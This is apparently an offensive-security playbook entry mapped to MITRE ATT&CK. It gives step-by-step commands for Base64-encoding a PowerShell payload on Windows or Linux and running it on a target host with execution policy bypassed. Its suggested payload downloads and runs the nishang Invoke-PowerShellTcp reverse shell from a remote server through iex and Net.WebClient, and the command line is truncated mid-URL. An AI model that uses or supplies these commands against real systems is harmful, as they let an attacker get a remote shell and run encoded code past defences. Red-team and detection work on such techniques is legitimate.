---
id: f55266ec-412f-4e32-a93a-6b86033a5772
name: Encode and Execute a Base64 PowerShell Command
type: procedure
verified: false
submitted: false
created_at: '2019-11-13T23:17:33.099017+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[PowerShell|T1086 - PowerShell]]'
platforms:
- Windows
tags:
- '[[encode]]'
- '[[powershell]]'
- '[[shell]]'
commands:
- '[[iconv Encode a String with UTF-16 and Base64]]'
- '[[PowerShell Base64 Encode a String]]'
- '[[PowerShell Execute a Base64 Encoded Command]]'
---

# Encode and Execute a Base64 PowerShell Command

## Summary

PowerShell has the ability to execute commands encoded in Base64, which helps avoid potential character restrictions and the balancing and nesting of quotation marks. 

## Description

# Description

PowerShell has the ability to execute commands encoded in Base64, which helps avoid potential character restrictions and the balancing and nesting of quotation marks.



# Instructions

In this example, the Invoke-Expression cmdlet is used to download and run Invoke-PowerShellTcp.ps1 from a remote server, the nishang reverse shell, but this script can be replaced with any other valid PowerShell command. This example will cover encoding a string using both Windows and Linux, as Linux requires an extra step to convert the string to UTF-16 before encoding it with Base64.



Suggested Payload: nishang's Invoke-PowerShellTcp.ps1: [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)



**Code**: [[iex (New-Object Net.WebClient).downloadString('htt]]





## Encoding Base64 in Windows

From a PowerShell prompt, create a new object assigned to the payload string, encode the string into bytes, then encode the result with Base64.





**Command** ([[PowerShell Base64 Encode a String]]):

```bash
$Text = "$_PAYLOAD"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText=[Convert]::ToBase64String($Bytes)
$EncodedText
```





## Encoding Base64 in Linux

Convert the command to UTF-16, then Base64 encode the result.





**Command** ([[iconv Encode a String with UTF-16 and Base64]]):

```bash
echo -n "$_PAYLOAD" | iconv -t utf-16le  | base64 -w 0
```



Note: The string is converted to UTF-16LE before Base64, as Windows uses UTF-16 encoding for strings, while Linux uses UTF-8.



## Execute the Command

Execute Encoded Command in Powershell on the Target Host





**Command** ([[PowerShell Execute a Base64 Encoded Command]]):

```powershell
powershell -ep bypass -enc $_PAYLOAD.b64
```



Note: the command will be executed in a new shell.



## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[PowerShell|T1086 - PowerShell]]

## Commands Used

- [[iconv Encode a String with UTF-16 and Base64]]
- [[PowerShell Base64 Encode a String]]
- [[PowerShell Execute a Base64 Encoded Command]]

## Tags

- [[encode]]
- [[powershell]]
- [[shell]]


